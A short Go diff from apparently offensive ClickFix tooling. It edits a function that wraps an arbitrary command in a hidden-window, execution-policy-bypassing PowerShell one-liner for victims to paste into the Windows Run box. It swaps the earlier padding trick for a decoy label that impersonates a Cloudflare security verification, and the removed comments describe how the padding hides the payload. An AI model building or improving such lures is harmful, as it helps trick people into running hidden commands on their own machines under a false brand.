@@ -81,11 +81,7 @@ func wrapClickFixPayload(command string) string {
 		strings.HasPrefix(lower, "wget ") || strings.HasPrefix(lower, "start ") {
 		return command
 	}
-	// Wrap: silent PowerShell, ~200 chars (within Win+R's ~260 limit).
-	// Short benign prefix (OS/date) fills the head, GUID padding after the
-	// payload fills the tail, VID at the end. The payload sits between —
-	// invisible from both directions. -w hidden = no window, no output.
-	return `powershell -w hidden -ep bypass -c "$os=[Environment]::OSVersion;$ts=Get-Date -f 'yyyyMMdd';` + command + `;$r=[GUID]::NewGuid();$id='Verification ID: {VID}'"`
+	return `powershell -w hidden -ep bypass -c "` + command + `;$id='Performance & security by Cloudflare - Verification ID: {VID}'"`
 }
 
 // renderClickFix substitutes all placeholders:
